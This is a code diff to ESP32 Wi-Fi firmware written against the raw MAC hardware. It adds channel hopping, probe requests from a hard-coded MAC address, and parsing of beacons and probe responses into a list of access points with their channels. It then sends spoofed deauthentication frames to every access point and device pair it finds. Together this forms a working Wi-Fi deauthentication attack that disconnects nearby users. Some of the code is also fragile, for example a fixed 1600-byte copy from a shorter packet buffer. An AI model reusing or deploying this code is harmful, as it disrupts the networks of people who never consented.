@@ -91,6 +91,8 @@ inline uint32_t read_register(uint32_t address) {
 #define WIFI_MAC_BITMASK _MMIO_ADDR(0x600a4080)
 #define WIFI_MAC_INITMASK _MMIO_ADDR(0x600a407c)
 
+#define MY_MAC_ADDRESS {0x40, 0x4c, 0xca, 0x51, 0x57, 0xd8}
+
 void wifi_hw_start(uint32_t param_1); // call with 2 for promiscuous mode
 void ic_set_vif(uint32_t param_1, int param_2, uint32_t mac_address_ptr, uint8_t param_4, uint8_t param_5, uint32_t param_6);
 void lmacProcessTxComplete(void);
@@ -187,8 +189,8 @@ uint8_t custom_deauth_packet[] = {
     0xc0, 0x0, /*duration*/ 0xff, 0xff, // The duration is unfortunately reset by the hardware,
 										// in facts in wireshark it is 0x0000
     0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination
-    0x08, 0x16, 0x05, 0xcc, 0xC6, 0x78, // Source
-    0x08, 0x16, 0x05, 0xcc, 0xC6, 0x78, // Source
+    0x40, 0x4c, 0xca, 0x51, 0x57, 0xd8, // Source
+    0x40, 0x4c, 0xca, 0x51, 0x57, 0xd8, // Source
     0xa0, 0xd0, 0x7, 0x0, 
     0xef, 0xbe, 0xad, 0xde
 };
@@ -199,7 +201,7 @@ unsigned char custom_probe_request_packet[] =
 	0x0, 0x0, 0x0, 0x0,
 	0x40, 0x0, 0x0, 0x0, 
 	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
-	0x96, 0x29, 0x4a, 0xad, 0x7d, 0xfc, 
+	0x40, 0x4c, 0xca, 0x51, 0x57, 0xd8,
 	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
 	0x90, 0x7e, 
 	// 32 bytes above
@@ -485,6 +487,17 @@ void on_receive(wifi_promiscuous_pkt_t *packet)
     // ESP_LOGI(TAG, "Calling open_mac_rx_callback");
     mac80211_frame *p = (mac80211_frame *)packet->payload;
 
+	// // If the packet is not a beacon, probe request or probe response, discard it
+	// if (p->frame_control.type != 0 || (p->frame_control.sub_type != 8 && p->frame_control.sub_type != 4 && p->frame_control.sub_type != 5))
+	// {
+	// 	return;
+	// }
+
+	// if (*(uint8_t *)((uint8_t *)packet->payload) != 0x40)
+	// {
+	// 	return;
+	// }
+
     // if ((memcmp(recv_mac_addr, p->receiver_address, 6)) 
     // && (memcmp(BROADCAST_MAC, p->receiver_address, 6)))
     // {
@@ -499,14 +512,17 @@ void on_receive(wifi_promiscuous_pkt_t *packet)
         return;
     }
 
-    wifi_promiscuous_pkt_t *packet_queue_copy = malloc(packet->rx_ctrl.sig_len + 28 - 4);
-    memcpy(packet_queue_copy, packet, packet->rx_ctrl.sig_len + 28-4);
+    // wifi_promiscuous_pkt_t *packet_queue_copy = malloc(packet->rx_ctrl.sig_len + 28 - 4);
+	mac80211_frame *packet_queue_copy = malloc(1600);
+    memcpy(packet_queue_copy, packet->payload, 1600);
     // ESP_LOGW(TAG, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
-    ESP_LOG_BUFFER_HEXDUMP("packet-content from open_mac_rx_callback", packet->payload, 200, ESP_LOG_INFO);
+    ESP_LOG_BUFFER_HEXDUMP("packet-content from open_mac_rx_callback", packet->payload, 100, ESP_LOG_INFO);
+	// ESP_LOG_BUFFER_HEXDUMP("mac80211-content from open_mac_rx_callback", packet->payload, 100, ESP_LOG_INFO);
     // ESP_LOGW(TAG, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
     if (!(xQueueSendToBack(packet_reception_queue, &packet_queue_copy, 0)))
     {
         ESP_LOGW(TAG, "MAC RX queue full!");
+		free(packet_queue_copy);
     }
     // else
     // {
@@ -625,6 +641,15 @@ void print_couple_ap_sta(const void *data)
 void send_deauth_from_to(const void *data)
 {
 	const CoupleAP_DEV *couple = (const CoupleAP_DEV *)data;
+	// If the channel is below 1 or above 11 then return
+	if(couple->ap.channel < 1 || couple->ap.channel > 11)
+	{
+		ESP_LOGE(TAG, "Channel %d is not supported", couple->ap.channel);
+		return;
+	}
+	// Switch to the channel of the AP
+	ESP_LOGI(TAG, "Switching to channel %d before deauthing", couple->ap.channel);
+	switch_channel(frequencies[couple->ap.channel - 1], 0);
 	const uint8_t *ap_mac = couple->ap.mac;
 	const uint8_t *dev_mac = couple->dev.mac;
 	// Use custom deauth packet, substitute the MAC addresses
@@ -641,7 +666,7 @@ void listen_to(int seconds)
 	uint64_t start_time = esp_timer_get_time();
 	while(true)
 	{
-		if(esp_timer_get_time() - start_time > 5 * 1000*1000) 
+		if(esp_timer_get_time() - start_time > seconds * 1000*1000) 
 		{
 			break;
 		}
@@ -697,12 +722,20 @@ void listen_to(int seconds)
 void send_and_receive_probes(int channel, int seconds)
 {
 	// Switch to the frequency
-	switch_channel(frequencies[channel], 0);
+	ESP_LOGI(TAG, "Switching to channel %d", channel);
+	switch_channel(frequencies[channel-1], 0);
+	// Set the channel in the probe request packet
+	custom_probe_request_packet[52] = (uint8_t)channel;
+	// Set my MAC address in the probe request packet
+	uint8_t mac[6] = MY_MAC_ADDRESS;
+	memcpy(custom_probe_request_packet + 18, mac, 6);
+	// Send 5 probe requests
+	for(int i = 0; i < 5; i++)
+	{
+		transmit_one(custom_probe_request_packet, 0, 1);
+		vTaskDelay(100 / portTICK_PERIOD_MS);
+	}
 
-	// Send probe requests
-	custom_probe_request_packet[52] = channel;
-
-	// Listen for 10 seconds and transmit again
 	listen_to(seconds);
 }
 
@@ -807,16 +840,16 @@ void wifi_hardware_task(hardware_mac_args *pvParameter)
 		//ESP_LOGW(TAG, "still alive");
 		//vTaskDelay(500 / portTICK_PERIOD_MS);
 	//}
-	static int counter = 0;
+	static int counter = 6;
 
 	while(true)
 	{
 
-		int next_index = (counter) % n_less_frequencies;
-		int next_frequency = less_frequencies[next_index];
-		ESP_LOGI(TAG, "Switching to frequency 0x%08x", next_frequency);
-		// Set the frequency
-		switch_channel(next_frequency, 0);
+		int next_index = (counter) % n_frequencies;
+		// int next_frequency = less_frequencies[next_index];
+		// ESP_LOGI(TAG, "Switching to frequency 0x%08x", next_frequency);
+		// // Set the frequency
+		// switch_channel(next_frequency, 0);
 		vTaskDelay(200 / portTICK_PERIOD_MS);
 
 		// // Transmit 5 packets
@@ -831,17 +864,49 @@ void wifi_hardware_task(hardware_mac_args *pvParameter)
 
 		// // Listen for 5 seconds
 		// listen_to(5);
-		send_and_receive_probes(0, 5);
+		ESP_LOGI(TAG, "================================");
+		ESP_LOGI(TAG, "Sending and receiving probes");
+		ESP_LOGI(TAG, "================================");
+		send_and_receive_probes(next_index+1, 5);
+		++counter;
+		// send_and_receive_probes(2, 5);
+		// send_and_receive_probes(3, 5);
+		// send_and_receive_probes(4, 5);
+		// send_and_receive_probes(5, 5);
+		// send_and_receive_probes(6, 5);
+		// send_and_receive_probes(7, 5);
+		// send_and_receive_probes(8, 5);
+		// send_and_receive_probes(9, 5);
+		// send_and_receive_probes(10, 5);
+		// send_and_receive_probes(11, 5);
 	}
 }
 
-
+uint8_t find_channel(uint8_t *fixed_and_tagged_parameters)
+{
+	uint8_t *tagged_parameters = fixed_and_tagged_parameters + 12;
+	// First paramter should be 0, then the length of the SSID, then the SSID
+	assert(tagged_parameters[0] == 0);
+	uint8_t ssid_length = tagged_parameters[1];
+	// Skip the SSID
+	tagged_parameters += 2 + ssid_length;
+	// Now we should have the supported rates
+	assert(tagged_parameters[0] == 1);
+	uint8_t supported_rates_length = tagged_parameters[1];
+	// Skip the supported rates
+	tagged_parameters += 2 + supported_rates_length;
+	// Now we should have the channel
+	assert(tagged_parameters[0] == 3);
+	assert(tagged_parameters[1] == 1);
+	ESP_LOGI(TAG, "Channel found: %d", tagged_parameters[2]);
+	return tagged_parameters[2];
+}
 
 void reading_task(void)
 {
     ESP_LOGI(TAG, "Starting reading_task");
 
-    packet_reception_queue = xQueueCreate(200, sizeof(wifi_promiscuous_pkt_t *));
+    packet_reception_queue = xQueueCreate(20, sizeof(wifi_promiscuous_pkt_t *));
     // assert(reception_queue);
 
     // openmac_sta_state_t sta_state = IDLE;
@@ -852,30 +917,54 @@ void reading_task(void)
 
     while(true) 
     {
-        wifi_promiscuous_pkt_t *packet;
-        if(xQueueReceive(packet_reception_queue, &packet, 10)) 
+        mac80211_frame *p;
+        if(xQueueReceive(packet_reception_queue, &p, 10)) 
         {
             ESP_LOGI(TAG, "xQueueReceive correctly received from packet_reception_queue");
-            mac80211_frame *p = (mac80211_frame *) packet->payload;
+            // mac80211_frame *p = (mac80211_frame *) packet->payload;
 
-            ESP_LOG_BUFFER_HEXDUMP("packet-content from reading_task", packet->payload, 200, ESP_LOG_INFO);
+            ESP_LOG_BUFFER_HEXDUMP("packet-content from reading_task", p, 100, ESP_LOG_INFO);
 
 			// If the packet is a beacon, then we add the AP to the network
 			if(p->frame_control.type == 0 && p->frame_control.sub_type == 8)
 			{
-				// Skip the first 10 bytes and copy the 6 bytes of the BSSID
+				ESP_LOGI(TAG, " --> Beacon packet");
+				ESP_LOG_BUFFER_HEXDUMP("Beacon packet", p, 200, ESP_LOG_INFO);		
 				uint8_t *bssid = p->transmitter_address;
-				MACAddress ap = {
-					.mac = {bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]}
-				};
+				MACAddress ap;
+				memcpy(ap.mac, bssid, 6);
+				ap.channel = find_channel(p->data_and_fcs);
+
 				insert_node(&network, &ap, sizeof(MACAddress), NULL, compare_mac_addresses);
 			}
+
+			// If the packet is a probe response 
+			if(p->frame_control.type == 0 && p->frame_control.sub_type == 5)
+			{
+				ESP_LOGI(TAG, " --> Probe response packet");
+				ESP_LOG_BUFFER_HEXDUMP("Probe response packet", p, 200, ESP_LOG_INFO);
+
+				// Check that the probe response is directed to us
+				uint8_t mac[6] = MY_MAC_ADDRESS;
+
+				if(memcmp(p->receiver_address, mac, 6) == 0)
+				{
+					ESP_LOGI(TAG, "   -- > Probe response directed to us");
+					// Skip the first 10 bytes and copy the 6 bytes of the BSSID
+					uint8_t *bssid = p->transmitter_address;
+					MACAddress ap = {
+						.mac = {bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]}
+					};
+					insert_node(&network, &ap, sizeof(MACAddress), NULL, compare_mac_addresses);
+				}
+			}
+
 			ESP_LOGI(TAG, "Network:");
 			process_tree(network, print_couple_ap_sta);
 
+			ESP_LOGI(TAG, "Sending deauth packets");
 			process_tree(network, send_deauth_from_to);
-
-            free(packet);
+            free(p);
         }
         else
         {
